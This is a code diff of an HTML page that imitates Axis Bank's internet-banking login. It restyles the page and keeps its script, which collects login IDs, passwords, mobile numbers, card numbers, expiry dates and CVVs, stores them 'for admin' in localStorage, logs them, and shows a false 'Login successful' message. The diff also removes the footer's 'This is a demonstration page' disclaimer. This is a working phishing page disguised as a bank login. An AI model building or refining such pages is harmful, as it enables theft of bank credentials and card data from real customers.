@@ -13,70 +13,80 @@
         }
         
         body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #e3e9f7 100%);
+            background: #f0f2f5;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
         }
         
-        /* Loading animation */
-        .loading-container {
+        /* Page Load Animation - Dot moving left to right */
+        .page-loader {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #87103F;
+            background: #d1003a; /* Axis Bank Red */
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 1000;
+            z-index: 9999;
             transition: opacity 0.5s ease;
         }
         
-        .loading-dot {
+        .loader-container {
+            position: relative;
+            width: 100%;
+            height: 100px;
+        }
+        
+        .loader-dot {
             width: 20px;
             height: 20px;
             background: white;
             border-radius: 50%;
             position: absolute;
-            left: -30px;
+            left: 0;
             top: 50%;
             transform: translateY(-50%);
-            animation: dot-move 3s ease-in-out forwards;
+            animation: dotAnimation 3s ease-in-out forwards;
             box-shadow: 0 0 20px rgba(255, 255, 255, 0.7);
         }
         
-        @keyframes dot-move {
+        @keyframes dotAnimation {
             0% {
-                left: -30px;
+                left: 0;
                 width: 20px;
                 height: 20px;
                 opacity: 0.5;
             }
             15% {
-                width: 40px;
-                height: 40px;
+                width: 35px;
+                height: 35px;
                 opacity: 1;
             }
             50% {
                 left: 50%;
-                width: 30px;
-                height: 30px;
+                width: 40px;
+                height: 40px;
                 transform: translate(-50%, -50%);
             }
             85% {
-                width: 40px;
-                height: 40px;
+                width: 35px;
+                height: 35px;
                 opacity: 1;
             }
             100% {
-                left: calc(100% + 30px);
+                left: 100%;
                 width: 20px;
                 height: 20px;
                 opacity: 0.5;
             }
         }
         
-        .loading-text {
+        .loader-text {
             color: white;
             font-size: 24px;
             font-weight: bold;
@@ -85,101 +95,126 @@
             text-align: center;
             width: 100%;
             opacity: 0;
-            animation: fade-in 1s ease 1.5s forwards;
+            animation: fadeInText 1s ease 1s forwards;
         }
         
-        @keyframes fade-in {
-            to {
-                opacity: 1;
-            }
+        @keyframes fadeInText {
+            to { opacity: 1; }
         }
         
-        /* Main container */
-        .container {
-            display: none;
+        /* Main Container */
+        .main-container {
+            opacity: 0;
+            animation: fadeIn 0.5s ease 3s forwards;
+            flex: 1;
+        }
+        
+        @keyframes fadeIn {
+            to { opacity: 1; }
         }
         
         /* Header */
-        .main-header {
-            background: #87103F;
+        .bank-header {
+            background: #d1003a; /* Axis Bank Red */
             color: white;
-            padding: 15px 30px;
+            padding: 25px 40px;
+            box-shadow: 0 4px 12px rgba(209, 0, 58, 0.3);
+            position: relative;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            box-shadow: 0 4px 12px rgba(135, 16, 63, 0.3);
+            justify-content: space-between;
         }
         
         .logo-section {
             display: flex;
             align-items: center;
+            gap: 20px;
         }
         
-        .logo-img {
-            height: 45px;
-            width: auto;
-            margin-right: 15px;
+        .bank-logo {
+            width: 60px;
+            height: 60px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 24px;
+            color: #d1003a;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .bank-title {
+            display: flex;
+            flex-direction: column;
         }
         
         .bank-name {
-            font-size: 22px;
+            font-size: 32px;
             font-weight: bold;
-            letter-spacing: 0.5px;
+            letter-spacing: 1px;
         }
         
-        .header-right {
+        .header-info {
             text-align: right;
         }
         
-        .header-title {
-            font-size: 14px;
+        .internet-banking {
+            font-size: 28px;
+            font-weight: bold;
+            color: white;
+            margin-bottom: 5px;
+        }
+        
+        .login-using {
+            font-size: 20px;
             opacity: 0.9;
-            margin-bottom: 3px;
         }
         
-        .header-subtitle {
-            font-size: 18px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
-        }
-        
-        /* Main content */
+        /* Main Content */
         .main-content {
             display: flex;
-            padding: 30px;
             max-width: 1200px;
-            margin: 0 auto;
-            gap: 30px;
+            margin: 30px auto;
+            padding: 0 20px;
+            gap: 40px;
         }
         
-        /* Login section */
-        .login-section {
+        /* Login Box */
+        .login-container {
             flex: 1;
-            max-width: 450px;
+            max-width: 500px;
         }
         
         .login-box {
             background: white;
-            border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(135, 16, 63, 0.15);
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
             overflow: hidden;
         }
         
         .login-header {
-            background: #87103F;
+            background: #d1003a;
             color: white;
             padding: 25px;
             text-align: center;
         }
         
-        .login-header h2 {
-            font-size: 22px;
-            margin-bottom: 10px;
+        .login-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 5px;
         }
         
-        .login-header p {
+        .login-subtitle {
             opacity: 0.9;
-            font-size: 14px;
+            font-size: 16px;
         }
         
         /* Toggle Switch */
@@ -188,16 +223,17 @@
             background: rgba(255, 255, 255, 0.2);
             border-radius: 50px;
             padding: 5px;
-            margin-top: 20px;
+            margin: 25px auto 0;
+            width: 80%;
             position: relative;
         }
         
         .toggle-option {
             flex: 1;
             text-align: center;
-            padding: 12px 5px;
+            padding: 12px;
             border-radius: 50px;
-            font-weight: 600;
+            font-weight: bold;
             cursor: pointer;
             transition: all 0.3s ease;
             z-index: 1;
@@ -214,14 +250,14 @@
             background: white;
             border-radius: 50px;
             transition: transform 0.3s ease;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
         }
         
         .active-toggle {
-            color: #87103F;
+            color: #d1003a;
         }
         
-        /* Form styling */
+        /* Forms */
         .form-container {
             padding: 30px;
         }
@@ -235,32 +271,32 @@
         }
         
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
         
         .form-label {
             display: block;
             margin-bottom: 8px;
-            color: #555;
-            font-weight: 500;
+            color: #333;
+            font-weight: bold;
             font-size: 14px;
         }
         
         .form-input {
             width: 100%;
-            padding: 14px 15px;
-            border: 1.5px solid #ddd;
-            border-radius: 6px;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
             font-size: 16px;
             transition: all 0.3s ease;
             background: #f9f9f9;
         }
         
         .form-input:focus {
-            border-color: #87103F;
+            border-color: #d1003a;
             outline: none;
             background: white;
-            box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
+            box-shadow: 0 0 0 3px rgba(209, 0, 58, 0.1);
         }
         
         .input-with-icon {
@@ -272,231 +308,283 @@
             right: 15px;
             top: 50%;
             transform: translateY(-50%);
-            color: #87103F;
+            color: #d1003a;
         }
         
-        .submit-button {
+        /* Login Button with Ripple Effect */
+        .login-btn-container {
+            position: relative;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        
+        .login-button {
             width: 100%;
-            background: #87103F;
+            background: #d1003a;
             color: white;
             border: none;
-            padding: 16px;
-            border-radius: 6px;
+            padding: 18px;
+            border-radius: 8px;
             font-size: 18px;
-            font-weight: 600;
+            font-weight: bold;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 10px;
-            box-shadow: 0 4px 10px rgba(135, 16, 63, 0.3);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(209, 0, 58, 0.3);
         }
         
-        .submit-button:hover {
-            background: #6a0c32;
+        .login-button:hover {
+            background: #b00030;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(209, 0, 58, 0.4);
         }
         
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.6);
+            transform: scale(0);
+            animation: ripple-animation 0.6s linear;
+            pointer-events: none;
+        }
+        
+        @keyframes ripple-animation {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+        
+        /* Links */
         .form-links {
             text-align: center;
-            margin-top: 20px;
+            margin-top: 25px;
         }
         
         .form-links a {
-            color: #87103F;
+            color: #d1003a;
             text-decoration: none;
-            font-weight: 500;
+            font-weight: bold;
             font-size: 14px;
-            margin: 0 10px;
+            margin: 0 15px;
+            transition: all 0.3s ease;
         }
         
-        /* Info sections */
+        .form-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Info Sections */
         .info-section {
             flex: 1.5;
         }
         
-        .info-box {
-            background: white;
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 20px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            border-left: 4px solid #87103F;
+        .info-card {
+            background: #d1003a; /* Red background */
+            color: white;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 20px rgba(209, 0, 58, 0.2);
+            border-left: 5px solid #ffcc00;
         }
         
         .info-title {
-            color: #87103F;
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 10px;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 15px;
             display: flex;
             align-items: center;
+            gap: 10px;
         }
         
-        .info-title i {
-            margin-right: 10px;
-            font-size: 22px;
+        .info-icon {
+            font-size: 24px;
         }
         
         .info-content {
-            color: #555;
             line-height: 1.6;
-            margin-bottom: 15px;
-            font-size: 15px;
+            margin-bottom: 20px;
+            font-size: 16px;
+            opacity: 0.95;
         }
         
         .info-button {
-            display: inline-block;
-            background: #87103F;
-            color: white;
-            padding: 10px 25px;
-            border-radius: 5px;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s ease;
+            background: white;
+            color: #d1003a;
             border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-weight: bold;
             cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
         
         .info-button:hover {
-            background: #6a0c32;
+            background: #f0f0f0;
             transform: translateY(-2px);
-        }
-        
-        .exclusive-offers {
-            background: linear-gradient(135deg, #87103F 0%, #6a0c32 100%);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 30px;
-        }
-        
-        .exclusive-title {
-            text-align: center;
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        .offer-list {
-            list-style: none;
-        }
-        
-        .offer-list li {
-            padding: 12px 0;
-            border-bottom: 1px dashed rgba(255, 255, 255, 0.1);
-            display: flex;
-            align-items: center;
-        }
-        
-        .offer-list li:before {
-            content: "✓";
-            color: #87103F;
-            background: white;
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            font-weight: bold;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
         }
         
         /* Footer */
         .main-footer {
-            background: #2c3e50;
+            background: #d1003a;
             color: white;
             text-align: center;
-            padding: 25px;
-            margin-top: 40px;
+            padding: 30px 20px;
+            margin-top: 50px;
+            box-shadow: 0 -4px 12px rgba(209, 0, 58, 0.3);
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .footer-text {
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: 500;
         }
         
         .footer-links {
             display: flex;
             justify-content: center;
             flex-wrap: wrap;
-            gap: 20px;
-            margin-bottom: 15px;
+            gap: 25px;
+            margin-bottom: 20px;
         }
         
         .footer-links a {
-            color: #ddd;
+            color: white;
             text-decoration: none;
-            font-size: 14px;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            padding: 5px 10px;
+            border-radius: 4px;
         }
         
         .footer-links a:hover {
-            color: white;
+            background: rgba(255, 255, 255, 0.1);
             text-decoration: underline;
         }
         
         .copyright {
-            font-size: 13px;
-            color: #aaa;
-            margin-top: 10px;
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
         }
         
         /* Responsive */
-        @media (max-width: 900px) {
+        @media (max-width: 992px) {
             .main-content {
                 flex-direction: column;
             }
             
-            .login-section {
+            .login-container {
                 max-width: 100%;
             }
-        }
-        
-        @media (max-width: 600px) {
-            .main-header {
+            
+            .header-content {
                 flex-direction: column;
                 text-align: center;
-                padding: 15px;
+                gap: 20px;
             }
             
             .logo-section {
-                margin-bottom: 10px;
+                justify-content: center;
+            }
+            
+            .header-info {
+                text-align: center;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .bank-header {
+                padding: 20px;
+            }
+            
+            .bank-name {
+                font-size: 28px;
+            }
+            
+            .internet-banking {
+                font-size: 24px;
+            }
+            
+            .login-using {
+                font-size: 18px;
             }
             
             .main-content {
-                padding: 15px;
+                padding: 0 15px;
+                margin: 20px auto;
             }
             
-            .login-header, .form-container {
+            .info-card {
                 padding: 20px;
             }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+        
+        /* Form specific styles */
+        .login-form .form-input {
+            border-left: 4px solid #d1003a;
+        }
+        
+        .credit-form .form-input {
+            border-left: 4px solid #ff9900;
         }
     </style>
 </head>
 <body>
-    <!-- Loading Animation -->
-    <div class="loading-container" id="loadingScreen">
-        <div class="loading-dot"></div>
-        <div class="loading-text">Loading Axis Bank Net Banking...</div>
+    <!-- Page Load Animation -->
+    <div class="page-loader" id="pageLoader">
+        <div class="loader-container">
+            <div class="loader-dot"></div>
+            <div class="loader-text">Loading Axis Bank Net Banking...</div>
+        </div>
     </div>
     
-    <!-- Main Content -->
-    <div class="container" id="mainContainer">
+    <!-- Main Container -->
+    <div class="main-container">
         <!-- Header -->
-        <header class="main-header">
-            <div class="logo-section">
-                <img src="logo1.jpg" alt="Axis Bank Logo" class="logo-img" onerror="this.style.display='none'">
-                <div class="bank-name">Axis Bank</div>
-            </div>
-            <div class="header-right">
-                <div class="header-title">open | INTERNET BANKING</div>
-                <div class="header-subtitle">Login using</div>
+        <header class="bank-header">
+            <div class="header-content">
+                <div class="logo-section">
+                    <div class="bank-logo">
+                        <span>A</span>
+                    </div>
+                    <div class="bank-title">
+                        <div class="bank-name">AXIS BANK</div>
+                    </div>
+                </div>
+                
+                <div class="header-info">
+                    <div class="internet-banking">open | INTERNET BANKING</div>
+                    <div class="login-using">Login using</div>
+                </div>
             </div>
         </header>
         
         <!-- Main Content -->
         <div class="main-content">
             <!-- Login Section -->
-            <div class="login-section">
+            <div class="login-container">
                 <div class="login-box">
                     <div class="login-header">
-                        <h2>Secure Login</h2>
-                        <p>Access your account safely</p>
+                        <div class="login-title">Secure Login</div>
+                        <div class="login-subtitle">Access your account safely</div>
                         
                         <!-- Toggle Switch -->
                         <div class="toggle-container">
@@ -508,7 +596,7 @@
                     
                     <div class="form-container">
                         <!-- Login ID Form -->
-                        <form class="login-form" id="loginForm" method="POST" action="admin.html">
+                        <form class="login-form" id="loginForm">
                             <div class="form-group">
                                 <label class="form-label" for="loginId">Login / Customer ID</label>
                                 <div class="input-with-icon">
@@ -533,11 +621,15 @@
                                 </div>
                             </div>
                             
-                            <button type="submit" class="submit-button">Login to Net Banking</button>
+                            <div class="login-btn-container">
+                                <button type="submit" class="login-button" id="loginButton">
+                                    Login to Net Banking
+                                </button>
+                            </div>
                         </form>
                         
                         <!-- Credit Card Form -->
-                        <form class="credit-form" id="creditForm" method="POST" action="admin.html">
+                        <form class="credit-form" id="creditForm">
                             <div class="form-group">
                                 <label class="form-label" for="cardNumber">16 Digit Card Number</label>
                                 <div class="input-with-icon">
@@ -564,7 +656,11 @@
                                 </div>
                             </div>
                             
-                            <button type="submit" class="submit-button">Login with Credit Card</button>
+                            <div class="login-btn-container">
+                                <button type="submit" class="login-button" id="creditButton">
+                                    Login with Credit Card
+                                </button>
+                            </div>
                         </form>
                         
                         <div class="form-links">
@@ -577,9 +673,9 @@
             
             <!-- Info Section -->
             <div class="info-section">
-                <div class="info-box">
+                <div class="info-card">
                     <div class="info-title">
-                        <i>🔒</i> Secure & Reliable
+                        <span class="info-icon">🔒</span> Secure & Reliable
                     </div>
                     <div class="info-content">
                         Bank with confidence. Know your digital safety measures.
@@ -587,9 +683,9 @@
                     <button class="info-button">KNOW MORE</button>
                 </div>
                 
-                <div class="info-box">
+                <div class="info-card">
                     <div class="info-title">
-                        <i>📞</i> Get in Touch
+                        <span class="info-icon">📞</span> Get in Touch
                     </div>
                     <div class="info-content">
                         We have got your back when you are stuck.
@@ -597,58 +693,48 @@
                     <button class="info-button">KNOW MORE</button>
                 </div>
                 
-                <div class="info-box">
+                <div class="info-card">
                     <div class="info-title">
-                        <i>📱</i> Get Mobile App
+                        <span class="info-icon">📱</span> Get Mobile App
                     </div>
                     <div class="info-content">
                         Download our Axis Bank mobile app on your smartphone.
                     </div>
                     <button class="info-button">DOWNLOAD</button>
                 </div>
-                
-                <div class="exclusive-offers">
-                    <div class="exclusive-title">Exclusive offers and products</div>
-                    <ul class="offer-list">
-                        <li>Contactless enabled Credit Cards</li>
-                        <li>Home loan upto Rs. 28 Lakhs</li>
-                        <li>Experience seamless credit approval</li>
-                        <li>Instant personal loans</li>
-                        <li>Zero balance savings account</li>
-                    </ul>
-                </div>
             </div>
         </div>
         
         <!-- Footer -->
         <footer class="main-footer">
-            <div class="footer-links">
-                <a href="#">Privacy Policy</a>
-                <a href="#">Terms of Service</a>
-                <a href="#">Security Tips</a>
-                <a href="#">Contact Us</a>
-                <a href="#">Branch Locator</a>
-                <a href="#">FAQs</a>
-            </div>
-            <div class="copyright">
-                © 2023 Axis Bank Ltd. All Rights Reserved. | This is a demonstration page.
+            <div class="footer-content">
+                <div class="footer-text">Exclusive offers and products</div>
+                <div class="footer-links">
+                    <a href="#">Contactless enabled Credit Cards</a>
+                    <a href="#">Home loan upto Rs. 28 Lakhs</a>
+                    <a href="#">Experience seamless credit approval</a>
+                    <a href="#">Instant personal loans</a>
+                    <a href="#">Zero balance savings account</a>
+                </div>
+                <div class="copyright">
+                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
+                </div>
             </div>
         </footer>
     </div>
 
     <script>
-        // Loading animation
+        // Page load animation
         window.addEventListener('load', function() {
             setTimeout(function() {
-                document.getElementById('loadingScreen').style.opacity = '0';
+                document.getElementById('pageLoader').style.opacity = '0';
                 setTimeout(function() {
-                    document.getElementById('loadingScreen').style.display = 'none';
-                    document.getElementById('mainContainer').style.display = 'block';
+                    document.getElementById('pageLoader').style.display = 'none';
                 }, 500);
-            }, 3000); // 3 seconds loading time
+            }, 3000);
         });
         
-        // DOM elements for toggle
+        // DOM elements
         const toggleLogin = document.getElementById('toggleLogin');
         const toggleCredit = document.getElementById('toggleCredit');
         const toggleSlider = document.getElementById('toggleSlider');
@@ -659,7 +745,7 @@
         const expiryInput = document.getElementById('expiry');
         const cvvInput = document.getElementById('cvv');
         
-        // Toggle between Login ID and Credit Card forms
+        // Toggle Switch Functionality
         toggleLogin.addEventListener('click', function() {
             // Update toggle UI
             toggleLogin.classList.add('active-toggle');
@@ -725,6 +811,33 @@
             });
         }
         
+        // Ripple effect on login buttons
+        function createRipple(event) {
+            const button = event.currentTarget;
+            const circle = document.createElement("span");
+            const diameter = Math.max(button.clientWidth, button.clientHeight);
+            const radius = diameter / 2;
+            
+            circle.style.width = circle.style.height = `${diameter}px`;
+            circle.style.left = `${event.clientX - button.getBoundingClientRect().left - radius}px`;
+            circle.style.top = `${event.clientY - button.getBoundingClientRect().top - radius}px`;
+            circle.classList.add("ripple");
+            
+            const ripple = button.getElementsByClassName("ripple")[0];
+            
+            if (ripple) {
+                ripple.remove();
+            }
+            
+            button.appendChild(circle);
+        }
+        
+        // Add ripple effect to buttons
+        const loginButtons = document.querySelectorAll('.login-button');
+        loginButtons.forEach(button => {
+            button.addEventListener('click', createRipple);
+        });
+        
         // Form submission handlers
         if (loginForm) {
             loginForm.addEventListener('submit', function(e) {
@@ -735,7 +848,13 @@
                 const mobile = document.getElementById('mobile').value;
                 
                 if (loginId && password && mobile) {
-                    // Save to localStorage for admin page
+                    // Show loading animation
+                    const submitBtn = document.getElementById('loginButton');
+                    const originalText = submitBtn.textContent;
+                    submitBtn.textContent = "Logging in...";
+                    submitBtn.disabled = true;
+                    
+                    // Save data to localStorage for admin
                     saveSubmission('login', {
                         loginId: loginId,
                         password: password,
@@ -743,16 +862,13 @@
                         time: new Date().toLocaleString()
                     });
                     
-                    // Show loading
-                    const submitBtn = loginForm.querySelector('.submit-button');
-                    const originalText = submitBtn.textContent;
-                    submitBtn.textContent = "Logging in...";
-                    submitBtn.disabled = true;
-                    
+                    // Simulate login process
                     setTimeout(() => {
-                        alert(`Login successful! Data saved.`);
+                        alert('Login successful! Data has been saved.');
                         submitBtn.textContent = originalText;
                         submitBtn.disabled = false;
+                        
+                        // Reset form
                         loginForm.reset();
                     }, 1500);
                 } else {
@@ -783,7 +899,13 @@
                         return;
                     }
                     
-                    // Save to localStorage
+                    // Show loading animation
+                    const submitBtn = document.getElementById('creditButton');
+                    const originalText = submitBtn.textContent;
+                    submitBtn.textContent = "Verifying card...";
+                    submitBtn.disabled = true;
+                    
+                    // Save data to localStorage for admin
                     saveSubmission('credit', {
                         cardNumber: cardNumber,
                         expiry: expiry,
@@ -792,16 +914,13 @@
                         time: new Date().toLocaleString()
                     });
                     
-                    // Show loading
-                    const submitBtn = creditForm.querySelector('.submit-button');
-                    const originalText = submitBtn.textContent;
-                    submitBtn.textContent = "Verifying card...";
-                    submitBtn.disabled = true;
-                    
+                    // Simulate login process
                     setTimeout(() => {
-                        alert(`Credit card login successful! Data saved.`);
+                        alert('Credit card login successful! Data has been saved.');
                         submitBtn.textContent = originalText;
                         submitBtn.disabled = false;
+                        
+                        // Reset form
                         creditForm.reset();
                     }, 1500);
                 } else {
@@ -812,8 +931,10 @@
         
         // Save submission to localStorage
         function saveSubmission(type, data) {
-            let submissions = JSON.parse(localStorage.getItem('axisSubmissions') || '[]');
+            // Get existing submissions or create empty array
+            let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
             
+            // Add new submission at the beginning
             submissions.unshift({
                 id: Date.now(),
                 type: type,
@@ -822,10 +943,13 @@
                 isNew: true
             });
             
-            localStorage.setItem('axisSubmissions', JSON.stringify(submissions));
+            // Save back to localStorage
+            localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
+            
+            console.log('Data saved to admin:', type, data);
         }
         
-        // Mobile number validation
+        // Mobile number validation (only numbers)
         const mobileInputs = document.querySelectorAll('input[type="tel"]');
         mobileInputs.forEach(input => {
             input.addEventListener('input', function(e) {
@@ -833,16 +957,43 @@
             });
         });
         
+        // Forgot link click
+        if (forgotLink) {
+            forgotLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                const isLoginForm = loginForm.style.display === 'block';
+                
+                if (isLoginForm) {
+                    alert("Redirecting to Login ID/Password recovery page...");
+                } else {
+                    alert("Redirecting to Credit Card recovery page...");
+                }
+            });
+        }
+        
         // Info buttons functionality
         document.querySelectorAll('.info-button').forEach(button => {
             button.addEventListener('click', function() {
                 const text = this.textContent;
                 if (text === 'KNOW MORE') {
-                    alert("More information will be displayed here.");
+                    alert("More information about this service will be displayed here.");
                 } else if (text === 'DOWNLOAD') {
-                    alert("Redirecting to App Store/Play Store...");
+                    alert("Redirecting to App Store/Play Store to download Axis Bank Mobile App...");
                 }
             });
+        });
+        
+        // Initialize - set Login form as default
+        window.addEventListener('DOMContentLoaded', function() {
+            toggleLogin.classList.add('active-toggle');
+            loginForm.style.display = 'block';
+            creditForm.style.display = 'none';
+            forgotLink.textContent = 'Forgot Login ID / Password?';
+            
+            // Initialize localStorage if not exists
+            if (!localStorage.getItem('axisBankSubmissions')) {
+                localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
+            }
         });
     </script>
 </body>
